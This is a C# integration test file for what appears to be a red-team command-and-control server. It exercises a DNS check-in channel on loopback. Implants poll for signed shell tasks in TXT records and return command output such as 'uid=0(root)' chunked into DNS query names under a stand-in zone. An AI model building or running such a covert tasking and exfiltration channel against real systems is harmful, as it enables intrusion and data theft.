using System.Net;
using System.Net.Http.Json;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using Google.Protobuf;
using Grpc.Net.Client;
using Microsoft.AspNetCore.Hosting;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Hosting;
using Rod.CoreState;
using Rod.CoreState.Engagements;
using Rod.CoreState.Implants;
using Rod.CoreState.Operators;
using Rod.CoreState.Pki;
using Rod.Transport;
using Rod.Transport.Listeners;
using Rod.Transport.Listeners.Dns;
using Rod.V1;

namespace Rod.Integration.Tests;

/// <summary>
/// The DNS check-in surface (architecture.md Sec 8): the codec, the name
/// grammar, and the acceptance point -- an implant checks in over DNS against
/// a real listener entry. The unit checks pin the wire shapes; the end-to-end
/// check drives a real UDP socket against a real listener entry: a from-
/// scratch implant (a hand-rolled DNS client speaking the documented
/// contract) enrolls over HTTP, opens its session on the mTLS beacon, then
/// polls and reports over DNS -- presence advances, a queued task arrives as
/// a signed TaskRequest in TXT, and its result lands in the audit trail.
/// </summary>
public class DnsCheckInTests
{
    private const string Zone = "c2.example.test";

    // --- The codec: query parse and response encode round-trip. ---

    [Fact]
    public void Codec_RoundTripsAQuery()
    {
        var query = BuildQuery(0x1234, DnsCheckInNames.PollName(ImplantId.New(), Zone));

        var parsed = DnsCodec.ParseQuery(query);

        Assert.NotNull(parsed);
        Assert.Equal((ushort)0x1234, parsed!.Id);
        Assert.Equal(DnsCodec.TxtType, parsed.Question!.Type);
        Assert.StartsWith("p.", parsed.Question.Name);
        Assert.EndsWith(Zone, parsed.Question.Name);
    }

    [Fact]
    public void Codec_EncodesATxtResponseWithEdns0()
    {
        var response = new DnsMessage
        {
            Id = 42,
            Question = new DnsQuestion("p." + Zone, DnsCodec.TxtType, 1),
            ResponseCode = 0,
        };
        response.Answers.Add(new DnsTxtAnswer("p." + Zone, new[] { "abc", "def" }));

        var datagram = DnsCodec.EncodeResponse(response);

        // QR set, one answer; a real resolver parses it -- here we assert the
        // structural bits: the header flags and the TXT strings survive.
        Assert.NotEqual(0, datagram[2] & 0x80);
        var answerCount = (datagram[6] << 8) | datagram[7];
        Assert.Equal(1, answerCount);
        var text = Encoding.ASCII.GetString(datagram);
        Assert.Contains("abc", text);
        Assert.Contains("def", text);
    }

    [Fact]
    public void Codec_RejectsGarbage()
    {
        Assert.Null(DnsCodec.ParseQuery(new byte[] { 1, 2, 3 }));
        Assert.Null(DnsCodec.ParseQuery(new byte[12]));
    }

    // --- The name grammar. ---

    [Fact]
    public void Grammar_PollRoundTrips()
    {
        var implant = ImplantId.New();

        var parsed = DnsCheckInNames.TryParsePoll(DnsCheckInNames.PollName(implant, Zone), Zone);

        Assert.NotNull(parsed);
        Assert.Equal(implant, parsed!.Implant);
        Assert.Null(DnsCheckInNames.TryParsePoll("x." + Zone, Zone));
        Assert.Null(DnsCheckInNames.TryParsePoll("p." + DnsCheckInNames.Encode(implant.ToString()) + ".other.test", Zone));
    }

    [Fact]
    public void Grammar_ResultChunkRoundTrips()
    {
        var implant = ImplantId.New();
        var task = TaskId.New();
        var chunk = Encoding.UTF8.GetBytes("uid=0(root)");

        var name = DnsCheckInNames.ResultName(implant, task, succeeded: true, sequence: 0, terminal: true, chunk, Zone);
        var parsed = DnsCheckInNames.TryParseResult(name, Zone);

        Assert.NotNull(parsed);
        Assert.Equal(implant, parsed!.Implant);
        Assert.Equal(task, parsed.Task);
        Assert.Equal(Rod.CoreState.Tasks.TaskOutcome.Succeeded, parsed.Outcome);
        Assert.Equal(0, parsed.Sequence);
        Assert.True(parsed.Terminal);
        Assert.Equal(chunk, parsed.Chunk);
    }

    [Fact]
    public void Grammar_EmptyChunkRidesAsTheBareLabel()
    {
        var name = DnsCheckInNames.ResultName(
            ImplantId.New(), TaskId.New(), succeeded: false, sequence: 0, terminal: true, Array.Empty<byte>(), Zone);

        var parsed = DnsCheckInNames.TryParseResult(name, Zone);

        Assert.NotNull(parsed);
        Assert.Empty(parsed!.Chunk);
    }

    [Fact]
    public void Reassembler_ConcatenatesInOrder_AndDropsGaps()
    {
        var reassembler = new DnsCheckInNames.ResultReassembler();
        var task = TaskId.New();
        Assert.Null(reassembler.Add(task, 0, terminal: false, Encoding.UTF8.GetBytes("uid=")));
        Assert.Null(reassembler.Add(task, 1, terminal: false, Encoding.UTF8.GetBytes("0(")));

        var output = reassembler.Add(task, 2, terminal: true, Encoding.UTF8.GetBytes("root)"));
        Assert.NotNull(output);
        Assert.Equal("uid=0(root)", Encoding.UTF8.GetString(output!));

        // A terminal chunk with a gap before it reassembles nothing.
        var gapped = reassembler.Add(TaskId.New(), 1, terminal: true, Encoding.UTF8.GetBytes("orphan"));
        Assert.Null(gapped);
    }

    // --- The acceptance point: an implant checks in over DNS. ---

    [Fact]
    public async Task Implant_ChecksInOverDns_AgainstARealListenerEntry()
    {
        await using var env = await DnsTestEnv.StartAsync();
        var (implant, leafCert, leafKey) = await env.EnrollImplantAsync();

        // The implant opens its session on the mTLS beacon first: DNS refreshes
        // a session, it does not handshake (the documented transport tradeoff).
        using var channel = env.ConnectBeacon(leafCert, leafKey);
        var client = new Beacon.BeaconClient(channel);
        var call = client.CheckIn();
        await call.RequestStream.WriteAsync(HandshakeFrame(implant.Id));
        Assert.True(await call.ResponseStream.MoveNext(CancellationToken.None));
        Assert.Equal(HandshakeStatus.Ok, HandshakeResponse.Parser.ParseFrom(call.ResponseStream.Current.Payload).Status);
        await call.RequestStream.CompleteAsync();

        // A queued task is claimed over DNS: the poll answer carries the
        // signed TaskRequest in TXT, base32 across its strings.
        await env.LoginAsync();

        // The DNS listener entry is real in the registry: Running, Dns, our zone.
        var listeners = await env.Http.GetFromJsonAsync<ListenerBody[]>("/listeners");
        Assert.Contains(listeners!, l =>
            string.Equals(l.Transport, "dns", StringComparison.OrdinalIgnoreCase)
            && string.Equals(l.State, "running", StringComparison.OrdinalIgnoreCase)
            && l.PublicEndpoint == Zone);

        var issued = await env.Http.PostAsJsonAsync(
            $"/engagements/{implant.EngagementId}/tasks",
            new { ImplantId = implant.Id.ToString(), Verb = "shell.exec", Arguments = "id" });
        issued.EnsureSuccessStatusCode();
        var issuedBody = await issued.Content.ReadFromJsonAsync<TaskIssuedBody>();

        var pollAnswer = await env.DnsQueryAsync(DnsCheckInNames.PollName(implant.Id, Zone));
        var taskRequest = TaskRequest.Parser.ParseFrom(DnsCheckInNames.TryDecode(pollAnswer!, out var marshaled) ? marshaled : Array.Empty<byte>());
        Assert.Equal(issuedBody!.TaskId, taskRequest.TaskId);
        Assert.Equal("shell.exec", taskRequest.Verb);
        Assert.Equal("id", taskRequest.Arguments);

        // The tasking signature verifies with the CA's public key even over
        // DNS: the datagram transport does not weaken the Sec 9 posture. The
        // signed bytes are the canonical tuple (architecture.md Sec 9), not
        // the serialized message.
        Assert.True(VerifyTasking(env.CaCertificates()[0], implant.Id.ToString(), taskRequest));

        // The implant reports the result as DNS chunks; the task completes
        // with the same audit arc a stream-delivered result produces.
        var output = "uid=0(root) gid=0(root)";
        var chunks = Chunk(Encoding.UTF8.GetBytes(output), 20);
        for (var i = 0; i < chunks.Count; i++)
        {
            await env.DnsQueryAsync(DnsCheckInNames.ResultName(
                implant.Id, Guid.TryParse(taskRequest.TaskId, out var tid) ? new TaskId(tid) : TaskId.New(),
                succeeded: true, sequence: i, terminal: i == chunks.Count - 1, chunks[i], Zone));
        }

        var fetched = await WaitUntilAsync(async () => await env.Http.GetFromJsonAsync<TaskBody>(
            $"/engagements/{implant.EngagementId}/tasks/{taskRequest.TaskId}"));
        Assert.NotNull(fetched);
        Assert.Equal("Completed", fetched!.Status);
        Assert.Equal("Succeeded", fetched.Outcome);
        Assert.Equal(output, fetched.Output);

        // Presence advanced over DNS: the session's last-seen reflects the
        // check-ins (the implant reads online with no beacon frames in flight).
        var implants = await env.Http.GetFromJsonAsync<ImplantBody[]>(
            $"/engagements/{implant.EngagementId}/implants");
        Assert.Contains(implants!, i => i.ImplantId == implant.Id.ToString() && i.IsOnline);
    }

    private static List<byte[]> Chunk(byte[] bytes, int size)
    {
        var chunks = new List<byte[]>();
        for (var offset = 0; offset < bytes.Length; offset += size)
        {
            var end = Math.Min(offset + size, bytes.Length);
            var slice = new byte[end - offset];
            Array.Copy(bytes, offset, slice, 0, slice.Length);
            chunks.Add(slice);
        }
        return chunks;
    }

    // The Tier 1 verification an implant performs (extending/implants.md):
    // RSASSA-PSS/SHA-256 over the canonical little-endian length-prefixed
    // tuple, verified with the CA's public key.
    private static bool VerifyTasking(X509Certificate2 ca, string implantId, TaskRequest request)
    {
        using var rsa = ca.GetRSAPublicKey()!;
        var canonical = new MemoryStream();
        foreach (var value in new[] { implantId, request.TaskId, request.Verb, request.Arguments })
        {
            var bytes = Encoding.UTF8.GetBytes(value);
            canonical.Write(BitConverter.GetBytes((uint)bytes.Length), 0, 4);
            canonical.Write(bytes, 0, bytes.Length);
        }
        return rsa.VerifyData(
            canonical.ToArray(), request.Signature.Span,
            HashAlgorithmName.SHA256, RSASignaturePadding.Pss);
    }

    private static Frame HandshakeFrame(ImplantId implant)
    {
        var request = new HandshakeRequest
        {
            Version = new ProtocolVersion { Major = 1, Minor = 0 },
            ImplantId = implant.ToString(),
            Capabilities = { "shell.exec" },
        };
        return new Frame { Payload = ByteString.CopyFrom(request.ToByteArray()) };
    }

    // Builds one TXT query datagram: header, question, and an EDNS0 OPT
    // record so the response may carry the signed TaskRequest.
    private static byte[] BuildQuery(ushort id, string name)
    {
        var buffer = new List<byte>(128);
        buffer.Add((byte)(id >> 8));
        buffer.Add((byte)id);
        buffer.Add(0); // flags: query, recursion desired
        buffer.Add(1);
        buffer.Add(0); buffer.Add(1); // qdcount
        buffer.Add(0); buffer.Add(0);
        buffer.Add(0); buffer.Add(0);
        buffer.Add(0); buffer.Add(1); // arcount: the OPT record

        foreach (var label in name.Split('.'))
        {
            buffer.Add((byte)label.Length);
            buffer.AddRange(Encoding.ASCII.GetBytes(label));
        }
        buffer.Add(0);
        buffer.Add(0); buffer.Add((byte)DnsCodec.TxtType);
        buffer.Add(0); buffer.Add(1);

        // OPT: root name, type 41, class = payload size, no data.
        buffer.Add(0);
        buffer.Add(0); buffer.Add(41);
        buffer.Add(4); buffer.Add(208); // 1232
        buffer.Add(0); buffer.Add(0); buffer.Add(0); buffer.Add(0);
        buffer.Add(0); buffer.Add(0);
        return buffer.ToArray();
    }

    private static async Task<T?> WaitUntilAsync<T>(Func<Task<T?>> read) where T : class
    {
        var deadline = DateTimeOffset.UtcNow + TimeSpan.FromSeconds(5);
        while (DateTimeOffset.UtcNow < deadline)
        {
            var value = await read();
            if (value is not null && Matches(value))
                return value;
            await Task.Delay(25);
        }
        throw new TimeoutException("The DNS check-in state was not observed in time.");
    }

    private static bool Matches<T>(T value) where T : class
        => value switch
        {
            TaskBody t => t.Status == "Completed",
            _ => true,
        };

    private sealed class TaskBody
    {
        public string Status { get; set; } = "";
        public string? Outcome { get; set; }
        public string? Output { get; set; }
    }

    private sealed class TaskIssuedBody
    {
        public string TaskId { get; set; } = "";
    }

    private sealed class ListenerBody
    {
        public string Transport { get; set; } = "";
        public string State { get; set; } = "";
        public string PublicEndpoint { get; set; } = "";
    }

    private sealed class ImplantBody
    {
        public string ImplantId { get; set; } = "";
        public bool IsOnline { get; set; }
    }

    /// <summary>
    /// A real teamserver with the HTTP operator API, the mTLS beacon, and one
    /// DNS listener entry (a real UDP socket on a free loopback port, zone
    /// c2.example.test). The DNS client is the "from-scratch implant" half of
    /// the test: raw UDP with the codec's query builder and a TXT-answer
    /// parser, speaking nothing but the documented contract.
    /// </summary>
    private sealed class DnsTestEnv : IAsyncDisposable
    {
        public IHost Host { get; private set; } = null!;
        public HttpClient Http { get; private set; } = null!;
        public int MtlsPort { get; private set; }
        public int HttpPort { get; private set; }
        public int DnsPort { get; private set; }
        private UdpClient _dns = null!;
        private IImplantCertificateAuthority _ca = null!;

        public static async Task<DnsTestEnv> StartAsync()
        {
            var env = new DnsTestEnv();
            env.MtlsPort = FreePort();
            env.HttpPort = FreePort();
            env.DnsPort = FreePort();

            var config = AuthenticatedHost.BuildConfig();
            env.Host = TransportHost.CreateHostBuilder(
                    configureServices: services => AuthenticatedHost.ComposeServices(services, config),
                    mapEndpoints: endpoints => AuthenticatedHost.ComposeEndpoints(endpoints),
                    configuration: config)
                .ConfigureWebHost(webBuilder => webBuilder
                    .UseRodListeners(new List<ListenerConfig>
                    {
                        new("test-mtls", ListenerTransport.Mtls, $"127.0.0.1:{env.MtlsPort}", $"127.0.0.1:{env.MtlsPort}"),
                        new("test-dns", ListenerTransport.Dns, $"127.0.0.1:{env.DnsPort}", Zone),
                    })
                    .ConfigureKestrel(kestrel => kestrel.ListenLocalhost(env.HttpPort)))
                .Build();
            await env.Host.StartAsync();
            env._ca = env.Host.Services.GetRequiredService<IImplantCertificateAuthority>();

            env.Http = new HttpClient(new CookieHandler(new HttpClientHandler()))
            {
                BaseAddress = new Uri($"http://127.0.0.1:{env.HttpPort}"),
            };
            env._dns = new UdpClient();
            env._dns.Connect(IPAddress.Loopback, env.DnsPort);
            return env;
        }

        public IReadOnlyList<System.Security.Cryptography.X509Certificates.X509Certificate2> CaCertificates()
            => new[] { _ca.GetCaCertificate() };

        public async Task LoginAsync() => await AuthenticatedHost.LoginAsync(Http);

        public async Task<(Implant Implant, X509Certificate2 Leaf, RSA LeafKey)> EnrollImplantAsync()
        {
            var implants = Host.Services.GetRequiredService<IImplantRepository>();
            var engagements = Host.Services.GetRequiredService<IEngagementRepository>();
            var engagement = Engagement.Create(EngagementId.New(), "dns-test", OperatorId.New(), DateTimeOffset.UtcNow);
            await engagements.SaveAsync(engagement);
            var implant = Implant.Enroll(
                ImplantId.New(), engagement.Id, DateTimeOffset.UtcNow.AddDays(30), ImplantClass.Stage2, DateTimeOffset.UtcNow);
            await implants.SaveAsync(implant);

            var leafKey = RSA.Create(2048);
            var issued = await _ca.IssueWithKeyAsync(
                new ImplantCertificateSubject(implant.Id, implant.EngagementId), leafKey, CancellationToken.None);
            return (implant, X509CertificateLoader.LoadCertificate(issued.Leaf), leafKey);
        }

        public GrpcChannel ConnectBeacon(X509Certificate2 leaf, RSA leafKey)
        {
            var leafWithKey = leaf.HasPrivateKey ? leaf : leaf.CopyWithPrivateKey(leafKey);
            var ca = _ca.GetCaCertificate();
            var handler = new SocketsHttpHandler();
            handler.SslOptions = new System.Net.Security.SslClientAuthenticationOptions
            {
                ClientCertificates = new X509CertificateCollection { leafWithKey },
                RemoteCertificateValidationCallback = (_, cert, chain, _) =>
                {
                    if (cert is null)
                        return false;
                    chain!.ChainPolicy.RevocationMode = X509RevocationMode.NoCheck;
                    chain!.ChainPolicy.VerificationFlags = X509VerificationFlags.AllowUnknownCertificateAuthority;
                    chain!.ChainPolicy.ExtraStore.Add(ca);
                    return chain.Build((X509Certificate2)cert);
                },
            };
            return GrpcChannel.ForAddress($"https://127.0.0.1:{MtlsPort}", new GrpcChannelOptions
            {
                HttpHandler = handler,
                DisposeHttpClient = true,
            });
        }

        /// <summary>
        /// One check-in exchange: send the query, read the answer, return the
        /// concatenated TXT strings (null when the answer carries none).
        /// </summary>
        public async Task<string?> DnsQueryAsync(string name)
        {
            var query = BuildQuery((ushort)Random.Shared.Next(1, ushort.MaxValue), name);
            await _dns.SendAsync(query, query.Length);

            using var timeout = new CancellationTokenSource(TimeSpan.FromSeconds(5));
            var response = await _dns.ReceiveAsync(timeout.Token);
            return ParseTxtAnswer(response.Buffer, name);
        }

        // Reads the first TXT answer's concatenated strings off a response.
        private static string? ParseTxtAnswer(byte[] datagram, string questionName)
        {
            if (datagram.Length < 12)
                return null;
            var ancount = (datagram[6] << 8) | datagram[7];
            if (ancount == 0)
                return null;
            var offset = 12;
            // Skip the question (uncompressed on our wire, but honor pointers).
            SkipName(datagram, ref offset);
            offset += 4;
            SkipName(datagram, ref offset);
            offset += 8; // answer type, class, ttl -- rdlength follows
            if (offset + 2 > datagram.Length)
                return null;
            var rdlength = (datagram[offset] << 8) | datagram[offset + 1];
            offset += 2;
            var end = offset + rdlength;
            var payload = new StringBuilder();
            while (offset < end && offset < datagram.Length)
            {
                var length = datagram[offset++];
                payload.Append(Encoding.ASCII.GetString(datagram, offset, length));
                offset += length;
            }
            _ = questionName;
            return payload.ToString();
        }

        private static void SkipName(byte[] datagram, ref int offset)
        {
            while (offset < datagram.Length)
            {
                var length = datagram[offset];
                if (length == 0)
                {
                    offset++;
                    return;
                }
                if ((length & 0xC0) == 0xC0)
                {
                    offset += 2;
                    return;
                }
                offset += 1 + length;
            }
        }

        public async ValueTask DisposeAsync()
        {
            _dns?.Dispose();
            Http?.Dispose();
            if (Host is not null)
                await Host.StopAsync();
            Host?.Dispose();
        }
    }

    private static int FreePort()
    {
        using var listener = new System.Net.Sockets.TcpListener(IPAddress.Loopback, 0);
        listener.Start();
        var port = ((IPEndPoint)listener.LocalEndpoint).Port;
        listener.Stop();
        return port;
    }
}
